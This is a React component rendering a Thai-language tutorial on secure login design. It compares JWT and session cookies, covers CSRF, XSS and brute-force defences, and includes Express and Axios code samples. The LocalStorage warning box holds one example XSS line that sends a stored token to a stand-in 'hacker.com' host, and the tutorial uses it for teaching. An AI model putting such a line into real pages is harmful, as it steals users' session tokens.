import React, { useState } from 'react';
import { Copy, Check, ShieldCheck, Key, Lock, AlertTriangle, ArrowRight, Sparkles } from 'lucide-react';
import { CodeBlock } from '../CodeBlock';
import { Callout } from '../Callout';
import { AuthFlowVisualizer } from '../widgets/AuthFlowVisualizer';

interface LoginChapterProps {
  promptText: string;
}

export const LoginChapter: React.FC<LoginChapterProps> = ({ promptText }) => {
  const [copiedPrompt, setCopiedPrompt] = useState(false);

  const handleCopyPrompt = async () => {
    try {
      await navigator.clipboard.writeText(promptText);
      setCopiedPrompt(true);
      setTimeout(() => setCopiedPrompt(false), 2000);
    } catch {
      // fallback
    }
  };

  return (
    <article className="prose prose-slate dark:prose-invert max-w-none text-slate-800 dark:text-slate-200">
      {/* Title & Meta */}
      <div className="border-b border-slate-200 dark:border-slate-800 pb-6 mb-8">
        <div className="flex items-center gap-2 text-xs font-medium text-indigo-600 dark:text-indigo-400 mb-2">
          <span>ความปลอดภัย & สถาปัตยกรรมระบบ</span>
          <span aria-hidden="true">·</span>
          <span>Security & Identity</span>
        </div>
        <h1 className="text-2xl sm:text-3xl lg:text-4xl font-bold tracking-tight text-slate-900 dark:text-white mb-3">
          การออกแบบระบบ Login และ Session Management
        </h1>
        <p className="text-base text-slate-600 dark:text-slate-400 leading-relaxed max-w-3xl">
          คู่มือเชิงลึกสำหรับ Software Engineer ในการสร้างระบบ Authentication ระดับ Enterprise 
          เปรียบเทียบข้อดีข้อเสียระหว่าง JWT และ Session-Cookie, แนวทางเก็บ Token ที่ปลอดภัยสูงสุด, 
          และการรับมือกับช่องโหว่ยอดนิยมอย่าง CSRF, XSS และ Brute-force Attack
        </p>

        <div className="flex items-center gap-2 text-xs text-slate-500 dark:text-slate-400 mt-4">
          <span>เวลาอ่านประมาณ 9 นาที</span>
          <span aria-hidden="true">·</span>
          <span>เวอร์ชัน 2026</span>
          <span aria-hidden="true">·</span>
          <button
            onClick={handleCopyPrompt}
            className="text-indigo-600 dark:text-indigo-400 hover:underline flex items-center gap-1 cursor-pointer"
          >
            {copiedPrompt ? <Check className="w-3 h-3 text-emerald-500" /> : <Sparkles className="w-3 h-3" />}
            {copiedPrompt ? 'คัดลอก Prompt แล้ว' : 'คัดลอก Master Prompt'}
          </button>
        </div>
      </div>

      {/* Section 1: Overview */}
      <section id="overview" className="scroll-mt-24 mb-12">
        <h2 className="text-xl sm:text-2xl font-bold text-slate-900 dark:text-white mb-4 flex items-center gap-2">
          <Key className="w-5 h-5 text-indigo-500" />
          บทนำ & ปัญหาที่พบบ่อยในระบบ Authentication
        </h2>
        <p className="text-sm sm:text-base leading-relaxed text-slate-700 dark:text-slate-300">
          การออกแบบระบบ Authentication ในยุคปัจจุบันไม่ได้มีเพียงแค่การตรวจสอบ Email และ Password 
          ให้ถูกต้องเท่านั้น แต่ยังรวมถึงความสามารถในการรองรับการขยายตัว (Scalability), 
          การเพิกถอนสิทธิ์อย่างทันท่วงที (Instant Revocation), และการป้องกันการถูกขโมย Identity 
          ผ่านช่องโหว่ในเบราว์เซอร์
        </p>
        <p className="text-sm sm:text-base leading-relaxed text-slate-700 dark:text-slate-300 mt-3">
          ข้อผิดพลาดร้ายแรงที่สุดที่พบได้บ่อยในทีมพัฒนาคือ:
        </p>
        <ul className="list-disc pl-5 my-3 space-y-1.5 text-sm sm:text-base text-slate-700 dark:text-slate-300">
          <li><strong>เก็บ JWT ไว้ใน LocalStorage</strong> ทำให้เมื่อเกิดช่องโหว่ XSS เพียงจุดเดียว แฮกเกอร์จะสามารถดูด Token ของผู้ใช้ไปได้ทันที</li>
          <li><strong>ใช้ JWT ที่มีอายุยืนยาว (เช่น 30 วัน) โดยไม่มีกลไก Blacklist</strong> ทำให้เมื่อ User ถูกระงับหรือเปลี่ยนรหัสผ่าน Token เดิมยังคงใช้งานได้อยู่</li>
          <li><strong>ไม่เปิดใช้งาน SameSite Cookie ร่วมกับ Anti-CSRF Token</strong> ทำให้ระบบเสี่ยงต่อการถูกปลอมแปลงคำขอข้ามเว็บไซต์ (Cross-Site Request Forgery)</li>
        </ul>
      </section>

      {/* Section 2: JWT vs Session */}
      <section id="jwt-vs-session" className="scroll-mt-24 mb-12">
        <h2 className="text-xl sm:text-2xl font-bold text-slate-900 dark:text-white mb-4">
          เปรียบเทียบเชิงลึก: JWT (Stateless) vs Session-Cookie (Stateful)
        </h2>
        <p className="text-sm sm:text-base leading-relaxed text-slate-700 dark:text-slate-300 mb-4">
          คำถามยอดฮิตของทีมสถาปัตยกรรมซอฟต์แวร์คือ <em>"เราควรเลือกใช้ JWT หรือ Session-Cookie ดี?"</em> 
          คำตอบที่แท้จริงขึ้นอยู่กับบริบทของระบบ:
        </p>

        {/* Comparison Matrix Table */}
        <div className="overflow-x-auto my-6 border border-slate-200 dark:border-slate-800 rounded-xl">
          <table className="w-full text-left text-xs sm:text-sm border-collapse">
            <thead>
              <tr className="bg-slate-100/80 dark:bg-slate-900/80 border-b border-slate-200 dark:border-slate-800 text-slate-900 dark:text-slate-100">
                <th className="p-3 font-semibold">หัวข้อพิจารณา</th>
                <th className="p-3 font-semibold text-indigo-600 dark:text-indigo-400">JWT (Stateless Token)</th>
                <th className="p-3 font-semibold text-emerald-600 dark:text-emerald-400">Traditional Session (Cookie + Redis/DB)</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-slate-200 dark:divide-slate-800 text-slate-700 dark:text-slate-300">
              <tr>
                <td className="p-3 font-medium text-slate-900 dark:text-slate-200">กลไกการเก็บข้อมูล</td>
                <td className="p-3">ข้อมูล (Claims) ฝังอยู่ในตัว Token และเซ็น Cryptographic Signature (HMAC/RSA)</td>
                <td className="p-3">เก็บ Session ID สุ่มใน Cookie ส่วนข้อมูลสิทธิ์ผู้ใช้เก็บใน Database หรือ Redis ฝั่งเซิร์ฟเวอร์</td>
              </tr>
              <tr>
                <td className="p-3 font-medium text-slate-900 dark:text-slate-200">การ Scale ของระบบ</td>
                <td className="p-3">ยอดเยี่ยมมาก ไม่ต้องอ่าน DB ซ้ำ ทุก Microservice สามารถถอดรหัส Public Key ตรวจสอบได้เอง</td>
                <td className="p-3">ต้องมี Centralized Store (เช่น Redis Cluster) ที่รองรับ Request ทุกครั้งที่มีการตรวจสอบสิทธิ์</td>
              </tr>
              <tr>
                <td className="p-3 font-medium text-slate-900 dark:text-slate-200">การเพิกถอนสิทธิ์ (Revocation)</td>
                <td className="p-3 text-rose-600 dark:text-rose-400 font-medium">ทำได้ยาก เพิกถอนทันทีไม่ได้จนกว่าจะหมดอายุ (เว้นแต่จะทำ Blacklist ซึ่งจะสูญเสียความเป็น Stateless)</td>
                <td className="p-3 text-emerald-600 dark:text-emerald-400 font-medium">ทำได้ทันที ลบ Key ใน Redis ก็จะ Logout ออกจากระบบทันที</td>
              </tr>
              <tr>
                <td className="p-3 font-medium text-slate-900 dark:text-slate-200">ขนาดข้อมูล (Data Size)</td>
                <td className="p-3">ขนาดใหญ่ (500B – 2KB) ส่งผ่าน Network ทุกรอบ Request</td>
                <td className="p-3">ขนาดเล็กมาก (เพียง 32-64 Bytes ของ Session ID)</td>
              </tr>
              <tr>
                <td className="p-3 font-medium text-slate-900 dark:text-slate-200">สถาปัตยกรรมที่เหมาะสม</td>
                <td className="p-3">Distributed Microservices, Multi-platform APIs (Mobile App, 3rd Party integrations)</td>
                <td className="p-3">Monolithic Application, SSR (Next.js, Remix, Laravel) หรือระบบที่ต้องการควบคุม Session เด็ดขาด เช่น ธนาคาร</td>
              </tr>
            </tbody>
          </table>
        </div>

        <Callout type="tip" title="สถาปัตยกรรมแบบผสม (Modern Hybrid Architecture - แนะนำ)">
          ในระบบสมัยใหม่ โครงสร้างที่ดีที่สุดคือ <strong>Dual-Token Pattern</strong>:
          <ul className="mt-2 space-y-1">
            <li><strong>Access Token (JWT):</strong> มีอายุสั้นมาก (5 - 15 นาที) บรรจุ Permissions/Roles ตรวจสอบได้เร็วในฝั่ง API Gateway โดยไม่ต้อง query DB</li>
            <li><strong>Refresh Token:</strong> มีอายุยาว (7 - 30 วัน) เก็บในรูปแบบ Session Record ใน Redis/Database และส่งผ่าน <strong>HttpOnly Cookie</strong> เพื่อนำมาแลก Access Token ชุดใหม่</li>
          </ul>
        </Callout>
      </section>

      {/* Section 3: Auth Flow Visualizer */}
      <section id="auth-flow" className="scroll-mt-24 mb-12">
        <h2 className="text-xl sm:text-2xl font-bold text-slate-900 dark:text-white mb-4">
          Flow การทำงานตั้งแต่ Login จนถึง Frontend Storage
        </h2>
        <p className="text-sm sm:text-base leading-relaxed text-slate-700 dark:text-slate-300">
          สถาปัตยกรรมนี้ป้องกันทั้งการถูกขโมย Token จากช่องโหว่ XSS และลดภาระ Database ด้วยการหมุนเวียน Token อย่างเป็นระบบ
        </p>

        <AuthFlowVisualizer />

        <div id="httponly-vs-localstorage" className="scroll-mt-24 mt-8">
          <h3 className="text-lg sm:text-xl font-bold text-slate-900 dark:text-white mb-3">
            HttpOnly Cookie vs LocalStorage: ทำไม LocalStorage จึงเป็นข้อห้าม?
          </h3>
          <p className="text-sm sm:text-base leading-relaxed text-slate-700 dark:text-slate-300">
            เบราว์เซอร์มีพื้นที่จัดเก็บข้อมูลหลากหลาย แต่ระดับความปลอดภัยไม่เท่ากันอย่างสิ้นเชิง:
          </p>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-4 my-4">
            <div className="p-4 rounded-xl border border-rose-200 dark:border-rose-900/60 bg-rose-50/30 dark:bg-rose-950/20 text-xs sm:text-sm">
              <h4 className="font-semibold text-rose-700 dark:text-rose-400 mb-2 flex items-center gap-1.5">
                <AlertTriangle className="w-4 h-4" /> LocalStorage (อันตรายสำหรับ Sensitive Tokens)
              </h4>
              <p className="text-slate-700 dark:text-slate-300 leading-relaxed mb-2">
                สามารถเข้าถึงได้ผ่าน JavaScript (<code className="text-rose-600 bg-rose-100 dark:bg-rose-900 px-1 py-0.5 rounded">window.localStorage</code>) 
                ดังนั้นหากเว็บไซต์มีช่องโหว่ XSS (เช่น จาก npm package แปลกปลอม หรือ user input ที่หลุด) 
                สคริปต์ของผู้ไม่ประสงค์ดีจะส่ง Token ไปยังภายนอกได้ทันที
              </p>
              <div className="font-mono text-xs text-rose-600 dark:text-rose-400 bg-white dark:bg-slate-900 p-2 rounded border border-rose-200 dark:border-rose-900">
                fetch('https://hacker.com/steal?token=' + localStorage.getItem('token'));
              </div>
            </div>

            <div className="p-4 rounded-xl border border-emerald-200 dark:border-emerald-900/60 bg-emerald-50/30 dark:bg-emerald-950/20 text-xs sm:text-sm">
              <h4 className="font-semibold text-emerald-700 dark:text-emerald-400 mb-2 flex items-center gap-1.5">
                <ShieldCheck className="w-4 h-4" /> HttpOnly Cookie (ปลอดภัยตามมาตรฐานสากล)
              </h4>
              <p className="text-slate-700 dark:text-slate-300 leading-relaxed mb-2">
                เมื่อเซิร์ฟเวอร์ส่ง Header <code className="text-emerald-700 dark:text-emerald-300 bg-emerald-100 dark:bg-emerald-900/50 px-1 py-0.5 rounded">Set-Cookie: ...; HttpOnly</code> 
                เบราว์เซอร์จะบล็อก JavaScript จากการอ่านหรือแก้ไข Cookie ตัวนี้ 100% 
                ต่อให้เว็บไซต์มี XSS แฮกเกอร์ก็ไม่สามารถขโมย Refresh Token ไปได้
              </p>
              <div className="font-mono text-xs text-emerald-700 dark:text-emerald-300 bg-white dark:bg-slate-900 p-2 rounded border border-emerald-200 dark:border-emerald-900">
                document.cookie // คืนค่าว่าง ไม่แสดง refreshToken เลย
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Section 4: Security Defenses */}
      <section id="security-defenses" className="scroll-mt-24 mb-12">
        <h2 className="text-xl sm:text-2xl font-bold text-slate-900 dark:text-white mb-4">
          แนวทางการป้องกันภัยคุกคาม (CSRF, XSS, Brute-force)
        </h2>

        <div className="space-y-6">
          <div>
            <h3 className="text-base sm:text-lg font-bold text-slate-900 dark:text-white mb-2">
              1. ป้องกัน Cross-Site Request Forgery (CSRF)
            </h3>
            <p className="text-sm sm:text-base leading-relaxed text-slate-700 dark:text-slate-300 mb-3">
              เมื่อเราใช้ Cookie เบราว์เซอร์จะแนบ Cookie ไปกับทุก Request อัตโนมัติ หากผู้ใช้เปิดเว็บไซต์ของคนร้าย 
              คนร้ายอาจหลอกให้ส่งคำขอมายังระบบเราได้ วิธีแก้ไขคือ:
            </p>
            <ul className="list-disc pl-5 space-y-2 text-sm sm:text-base text-slate-700 dark:text-slate-300">
              <li>
                <strong>ตั้งค่า SameSite=Strict หรือ SameSite=Lax:</strong> ป้องกันไม่ให้เบราว์เซอร์ส่ง Cookie 
                เมื่อคำขอเริ่มต้นจากเว็บไซต์อื่น
              </li>
              <li>
                <strong>Custom Header Check:</strong> กำหนดให้ Request ต้องมี Header พิเศษ เช่น 
                <code className="text-indigo-600 bg-slate-100 dark:bg-slate-800 px-1.5 py-0.5 rounded">X-Requested-With: XMLHttpRequest</code> 
                เพราะแท็ก Form หรือ Image ธรรมดาของคนร้ายไม่สามารถสร้าง Custom Header ข้าม Origin ได้
              </li>
            </ul>
          </div>

          <div>
            <h3 className="text-base sm:text-lg font-bold text-slate-900 dark:text-white mb-2">
              2. ป้องกัน Cross-Site Scripting (XSS)
            </h3>
            <p className="text-sm sm:text-base leading-relaxed text-slate-700 dark:text-slate-300 mb-2">
              XSS เกิดจากการนำ input ของผู้ใช้ไป render ในหน้าจอโดยไม่ได้ Escape ข้อมูลอย่างถูกต้อง
            </p>
            <ul className="list-disc pl-5 space-y-1.5 text-sm sm:text-base text-slate-700 dark:text-slate-300">
              <li>ห้ามใช้ <code className="text-slate-800 dark:text-slate-200">dangerouslySetInnerHTML</code> หรือ <code className="text-slate-800 dark:text-slate-200">innerHTML</code> เด็ดขาดถ้าไม่ผ่านการ Sanitize ด้วย DOMPurify</li>
              <li>กำหนด HTTP Header <strong>Content-Security-Policy (CSP)</strong> เพื่อไม่อนุญาตให้รัน inline script จากภายนอก</li>
            </ul>
          </div>

          <div>
            <h3 className="text-base sm:text-lg font-bold text-slate-900 dark:text-white mb-2">
              3. ป้องกัน Brute-force & Credential Stuffing ด้วย Rate Limiting
            </h3>
            <p className="text-sm sm:text-base leading-relaxed text-slate-700 dark:text-slate-300">
              ตั้งค่า Limit ที่ Endpoint <code className="text-slate-800 dark:text-slate-200 font-mono">/api/auth/login</code> 
              โดยจำกัดไม่เกิน 5 ครั้ง ต่อ 15 นาที ต่อ IP Address หรือต่อ Email เพื่อสกัดกั้นการใช้บอทเดารหัสผ่าน
            </p>
          </div>
        </div>
      </section>

      {/* Section 5: Code Implementation */}
      <section id="implementation-code" className="scroll-mt-24 mb-12">
        <h2 className="text-xl sm:text-2xl font-bold text-slate-900 dark:text-white mb-4">
          ตัวอย่างโค้ดสถาปัตยกรรมระดับ Production (Node.js/Express & Client)
        </h2>

        <p className="text-sm sm:text-base leading-relaxed text-slate-700 dark:text-slate-300 mb-2">
          ตัวอย่าง Controller จัดการ Login, การตั้งค่า Secure Cookie, และการตรวจสอบ Token:
        </p>

        <CodeBlock
          filename="backend/src/controllers/auth.controller.ts"
          language="typescript"
          code={`import { Request, Response } from 'express';
import argon2 from 'argon2';
import jwt from 'jsonwebtoken';
import { rateLimit } from 'express-rate-limit';

// 1. Rate Limiting ป้องกัน Brute Force Attack
export const loginRateLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 นาที
  max: 5, // อนุญาตไม่เกิน 5 ครั้งต่อ IP
  message: {
    status: 429,
    message: 'คุณพยายามเข้าสู่ระบบมากเกินกำหนด กรุณารอ 15 นาที'
  },
  standardHeaders: true,
  legacyHeaders: false,
});

// 2. Controller สำหรับการ Login
export const handleLogin = async (req: Request, res: Response): Promise<void> => {
  const { email, password } = req.body;

  // ค้นหาผู้ใช้จาก Database (จำลอง)
  const user = await findUserByEmail(email);
  if (!user) {
    res.status(401).json({ message: 'อีเมลหรือรหัสผ่านไม่ถูกต้อง' });
    return;
  }

  // ตรวจสอบรหัสผ่านด้วย Argon2id ปลอดภัยสูงสุด
  const isMatch = await argon2.verify(user.passwordHash, password);
  if (!isMatch) {
    res.status(401).json({ message: 'อีเมลหรือรหัสผ่านไม่ถูกต้อง' });
    return;
  }

  // ออก Access Token อายุสั้น (15 นาที) สำหรับเรียก API
  const accessToken = jwt.sign(
    { sub: user.id, role: user.role },
    process.env.ACCESS_TOKEN_SECRET!,
    { expiresIn: '15m' }
  );

  // ออก Refresh Token อายุยาว (7 วัน)
  const refreshToken = jwt.sign(
    { sub: user.id, tokenVersion: user.tokenVersion },
    process.env.REFRESH_TOKEN_SECRET!,
    { expiresIn: '7d' }
  );

  // เก็บ Refresh Token ลงใน HttpOnly Cookie
  res.cookie('refreshToken', refreshToken, {
    httpOnly: true, // ป้องกัน JavaScript / XSS เข้าถึง
    secure: process.env.NODE_ENV === 'production', // ส่งผ่าน HTTPS เท่านั้น
    sameSite: 'strict', // ป้องกัน CSRF 100%
    path: '/api/v1/auth', // จำกัด Path ให้ส่งเฉพาะ Auth Endpoints
    maxAge: 7 * 24 * 60 * 60 * 1000, // 7 วัน
  });

  // ส่งคืน Access Token ให้ Frontend เก็บใน Memory (RAM)
  res.status(200).json({
    status: 'success',
    accessToken,
    user: { id: user.id, email: user.email, role: user.role }
  });
};`}
        />

        <p className="text-sm sm:text-base leading-relaxed text-slate-700 dark:text-slate-300 mt-6 mb-2">
          ฝั่ง Frontend: การใช้ Axios Interceptor ดักจับ Token หมดอายุ (401) และทำ Silent Refresh โดยอัตโนมัติ:
        </p>

        <CodeBlock
          filename="frontend/src/services/apiClient.ts"
          language="typescript"
          code={`import axios from 'axios';

// Access Token เก็บใน JavaScript In-Memory เท่านั้น (ห้ามใส่ LocalStorage)
let inMemoryAccessToken: string | null = null;

export const setAccessToken = (token: string | null) => {
  inMemoryAccessToken = token;
};

export const apiClient = axios.create({
  baseURL: '/api/v1',
  withCredentials: true, // ส่ง HttpOnly Cookie ไปกับทุกคำขอ
});

// Request Interceptor: แนบ Access Token เข้า Header
apiClient.interceptors.request.use((config) => {
  if (inMemoryAccessToken) {
    config.headers.Authorization = \`Bearer \${inMemoryAccessToken}\`;
  }
  return config;
});

// Response Interceptor: จัดการ Token หมดอายุ (401) แบบอัตโนมัติ
apiClient.interceptors.response.use(
  (response) => response,
  async (error) => {
    const originalRequest = error.config;

    // หากได้ 401 และยังไม่ได้ลอง retry
    if (error.response?.status === 401 && !originalRequest._retry) {
      originalRequest._retry = true;

      try {
        // ขอ Access Token ใหม่ผ่าน HttpOnly Cookie
        const refreshResponse = await axios.post(
          '/api/v1/auth/refresh',
          {},
          { withCredentials: true }
        );

        const newAccessToken = refreshResponse.data.accessToken;
        setAccessToken(newAccessToken);

        // นำ Token ใหม่ไปยิง Request เดิมซ้ำ
        originalRequest.headers.Authorization = \`Bearer \${newAccessToken}\`;
        return apiClient(originalRequest);
      } catch (refreshError) {
        // Refresh Token หมดอายุหรือถูกเพิกถอน นำทางไปหน้า Login
        setAccessToken(null);
        window.location.href = '/login';
        return Promise.reject(refreshError);
      }
    }

    return Promise.reject(error);
  }
);`}
        />
      </section>

      {/* Section 6: Best Practices Checklist */}
      <section id="best-practices-checklist" className="scroll-mt-24 mb-12">
        <h2 className="text-xl sm:text-2xl font-bold text-slate-900 dark:text-white mb-4">
          Checklist สรุปข้อพึงปฏิบัติสำหรับทีมวิศวกรซอฟต์แวร์
        </h2>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
          <div className="p-4 rounded-xl border border-slate-200 dark:border-slate-800 bg-white dark:bg-slate-950 text-xs sm:text-sm">
            <h4 className="font-semibold text-slate-900 dark:text-slate-100 mb-2 text-emerald-600 dark:text-emerald-400">
              สิ่งที่ต้องทำ (Do)
            </h4>
            <ul className="space-y-2 text-slate-600 dark:text-slate-400">
              <li className="flex items-start gap-2">
                <Check className="w-4 h-4 text-emerald-500 shrink-0 mt-0.5" />
                <span>เข้ารหัส Password ด้วย Argon2id หรือ Bcrypt Work Factor $\ge 12$</span>
              </li>
              <li className="flex items-start gap-2">
                <Check className="w-4 h-4 text-emerald-500 shrink-0 mt-0.5" />
                <span>จำกัดอายุ Access Token ให้สั้น ($\le 15$ นาที)</span>
              </li>
              <li className="flex items-start gap-2">
                <Check className="w-4 h-4 text-emerald-500 shrink-0 mt-0.5" />
                <span>ตั้งค่า Cookie ด้วยแฟลก <code className="text-slate-800 dark:text-slate-200 font-mono">HttpOnly; Secure; SameSite=Strict</code></span>
              </li>
              <li className="flex items-start gap-2">
                <Check className="w-4 h-4 text-emerald-500 shrink-0 mt-0.5" />
                <span>ทำ Refresh Token Rotation ทุกครั้งที่มีการขอ Token ใหม่</span>
              </li>
            </ul>
          </div>

          <div className="p-4 rounded-xl border border-slate-200 dark:border-slate-800 bg-white dark:bg-slate-950 text-xs sm:text-sm">
            <h4 className="font-semibold text-slate-900 dark:text-slate-100 mb-2 text-rose-600 dark:text-rose-400">
              สิ่งที่ไม่ควรทำ (Don't)
            </h4>
            <ul className="space-y-2 text-slate-600 dark:text-slate-400">
              <li className="flex items-start gap-2">
                <AlertTriangle className="w-4 h-4 text-rose-500 shrink-0 mt-0.5" />
                <span>ห้ามเก็บ Access/Refresh Token ไว้ใน LocalStorage หรือ SessionStorage</span>
              </li>
              <li className="flex items-start gap-2">
                <AlertTriangle className="w-4 h-4 text-rose-500 shrink-0 mt-0.5" />
                <span>ห้ามใส่ข้อมูล Sensitive (เช่น Password, บัตร ปชช.) ลงใน JWT Payload</span>
              </li>
              <li className="flex items-start gap-2">
                <AlertTriangle className="w-4 h-4 text-rose-500 shrink-0 mt-0.5" />
                <span>ห้ามยอมรับ Algorithm "none" ในการตรวจลายเซ็น JWT</span>
              </li>
              <li className="flex items-start gap-2">
                <AlertTriangle className="w-4 h-4 text-rose-500 shrink-0 mt-0.5" />
                <span>ห้ามลืมเปิด Rate Limiting บน Route <code className="text-slate-800 dark:text-slate-200 font-mono">/login</code> และ <code className="text-slate-800 dark:text-slate-200 font-mono">/forgot-password</code></span>
              </li>
            </ul>
          </div>
        </div>
      </section>

      {/* Section 7: Prompt */}
      <section id="original-prompt" className="scroll-mt-24 mb-12 p-6 rounded-xl border border-indigo-200 dark:border-indigo-900/60 bg-indigo-50/40 dark:bg-indigo-950/20">
        <div className="flex items-center justify-between gap-4 mb-3">
          <div className="flex items-center gap-2">
            <Sparkles className="w-5 h-5 text-indigo-600 dark:text-indigo-400" />
            <h3 className="text-base font-semibold text-slate-900 dark:text-white">
              Prompt ต้นฉบับสำหรับสร้างบทความนี้ (AI Generation Template)
            </h3>
          </div>
          <button
            onClick={handleCopyPrompt}
            className="flex items-center gap-1.5 px-3 py-1.5 text-xs font-medium bg-indigo-600 hover:bg-indigo-700 text-white rounded-lg transition-colors cursor-pointer"
          >
            {copiedPrompt ? (
              <>
                <Check className="w-3.5 h-3.5" /> คัดลอกแล้ว
              </>
            ) : (
              <>
                <Copy className="w-3.5 h-3.5" /> คัดลอก Prompt
              </>
            )}
          </button>
        </div>
        <p className="text-xs text-slate-600 dark:text-slate-400 mb-3">
          สามารถคัดลอก Prompt ด้านล่างนี้ไปใช้สั่งการโมเดล LLM เพื่อนำไปต่อยอด สร้างแบบฝึกหัด หรือทำข้อสอบในทีม:
        </p>
        <pre className="p-4 rounded-lg bg-white dark:bg-slate-950 border border-slate-200 dark:border-slate-800 text-xs text-slate-800 dark:text-slate-200 font-mono whitespace-pre-wrap leading-relaxed">
          {promptText}
        </pre>
      </section>
    </article>
  );
};
